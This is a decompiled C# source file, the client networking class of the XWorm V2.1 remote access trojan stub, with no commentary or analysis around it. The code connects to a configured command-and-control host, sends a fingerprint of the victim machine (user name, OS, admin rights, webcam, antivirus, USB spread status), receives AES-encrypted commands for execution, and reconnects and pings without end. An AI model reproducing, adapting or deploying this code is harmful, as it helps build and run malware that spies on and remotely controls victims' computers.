using System;
using System.IO;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Threading;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;

namespace Stub;

public class ClientSocket
{
	public static bool isConnected = false;

	public static Socket S;

	public static long BufferLength = 0L;

	public static byte[] Buffer;

	public static MemoryStream MS = new MemoryStream();

	public static readonly object SPL = Settings.SPL;

	public static void BeginConnect()
	{
		Thread.Sleep(4000);
		if (isConnected)
		{
			return;
		}
		try
		{
			try
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					S = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
					BufferLength = -1L;
					Buffer = new byte[1];
					MS = new MemoryStream();
					S.ReceiveBufferSize = 512000;
					S.SendBufferSize = 512000;
					try
					{
						S.Connect(Settings.Host, Conversions.ToInteger(Settings.Port));
						isConnected = true;
						Send(Conversions.ToString(Info()));
						S.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, BeginReceive, S);
						GC.Collect();
					}
					catch (Exception ex5)
					{
						ProjectData.SetProjectError(ex5);
						Exception ex6 = ex5;
						GC.Collect();
						isDisconnected();
						ProjectData.ClearProjectError();
					}
				});
				thread.Start();
				GC.Collect();
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				ProjectData.ClearProjectError();
			}
		}
		catch (Exception ex3)
		{
			ProjectData.SetProjectError(ex3);
			Exception ex4 = ex3;
			isDisconnected();
			ProjectData.ClearProjectError();
		}
	}

	public static object Info()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		ComputerInfo val = new ComputerInfo();
		return string.Concat("INFO", RuntimeHelpers.GetObjectValue(SPL), Helper.ID(), RuntimeHelpers.GetObjectValue(SPL), Environment.UserName, RuntimeHelpers.GetObjectValue(SPL), val.get_OSFullName().Replace("Microsoft", null), Environment.OSVersion.ServicePack.Replace("Service Pack", "SP") + " ", Environment.Is64BitOperatingSystem.ToString().Replace("False", "32bit").Replace("True", "64bit"), RuntimeHelpers.GetObjectValue(SPL), "XWorm V2.1", RuntimeHelpers.GetObjectValue(SPL), Helper.INDATE(), RuntimeHelpers.GetObjectValue(SPL), Helper.usbp(), RuntimeHelpers.GetObjectValue(SPL), Helper.admin(), RuntimeHelpers.GetObjectValue(SPL), Messages.Cam(), RuntimeHelpers.GetObjectValue(SPL), Helper.Antivirus());
	}

	public static void BeginReceive(IAsyncResult ar)
	{
		//Discarded unreachable code: IL_019f
		if (!isConnected)
		{
			isDisconnected();
		}
		checked
		{
			try
			{
				int num = S.EndReceive(ar);
				if (num > 0)
				{
					if (BufferLength == -1)
					{
						if (Buffer[0] == 0)
						{
							BufferLength = Conversions.ToLong(Helper.BS(MS.ToArray()));
							MS.Dispose();
							MS = new MemoryStream();
							if (BufferLength == 0)
							{
								BufferLength = -1L;
								S.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, BeginReceive, S);
								return;
							}
							Buffer = new byte[(int)(BufferLength - 1) + 1];
						}
						else
						{
							MS.WriteByte(Buffer[0]);
						}
					}
					else
					{
						MS.Write(Buffer, 0, num);
						if (MS.Length == BufferLength)
						{
							ThreadPool.QueueUserWorkItem(delegate(object a0)
							{
								BeginRead((byte[])a0);
							}, MS.ToArray());
							BufferLength = -1L;
							MS.Dispose();
							MS = new MemoryStream();
							Buffer = new byte[1];
						}
						else
						{
							Buffer = new byte[(int)(BufferLength - MS.Length - 1) + 1];
						}
					}
					S.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, BeginReceive, S);
				}
				else
				{
					isDisconnected();
				}
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				isDisconnected();
				ProjectData.ClearProjectError();
			}
		}
	}

	public static void BeginRead(byte[] b)
	{
		try
		{
			Messages.Read(b);
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			ProjectData.ClearProjectError();
		}
	}

	public static void Send(string msg)
	{
		try
		{
			using MemoryStream memoryStream = new MemoryStream();
			byte[] array = Helper.AES_Encryptor(Helper.SB(msg));
			byte[] array2 = Helper.SB(Conversions.ToString(array.Length) + "\0");
			memoryStream.Write(array2, 0, array2.Length);
			memoryStream.Write(array, 0, array.Length);
			S.Poll(-1, SelectMode.SelectWrite);
			S.Send(memoryStream.ToArray(), 0, checked((int)memoryStream.Length), SocketFlags.None);
			GC.Collect();
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			isDisconnected();
			ProjectData.ClearProjectError();
		}
	}

	private static void EndSend(IAsyncResult ar)
	{
		try
		{
			S.EndSend(ar);
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			ProjectData.ClearProjectError();
		}
	}

	public static void isDisconnected()
	{
		isConnected = false;
		try
		{
			S.Close();
			S.Dispose();
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			ProjectData.ClearProjectError();
		}
		try
		{
			MS.Close();
			MS.Dispose();
		}
		catch (Exception ex3)
		{
			ProjectData.SetProjectError(ex3);
			Exception ex4 = ex3;
			ProjectData.ClearProjectError();
		}
		BeginConnect();
	}

	public static void Ping()
	{
		while (true)
		{
			Thread.Sleep(30000);
			try
			{
				if (S.Connected)
				{
					using MemoryStream memoryStream = new MemoryStream();
					byte[] array = Helper.AES_Encryptor(Helper.SB("PING?"));
					byte[] array2 = Helper.SB(Conversions.ToString(array.Length) + "\0");
					memoryStream.Write(array2, 0, array2.Length);
					memoryStream.Write(array, 0, array.Length);
					S.Poll(-1, SelectMode.SelectWrite);
					S.Send(memoryStream.ToArray(), 0, checked((int)memoryStream.Length), SocketFlags.None);
					GC.Collect();
					GC.WaitForPendingFinalizers();
				}
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				isConnected = false;
				GC.Collect();
				ProjectData.ClearProjectError();
			}
		}
	}
}
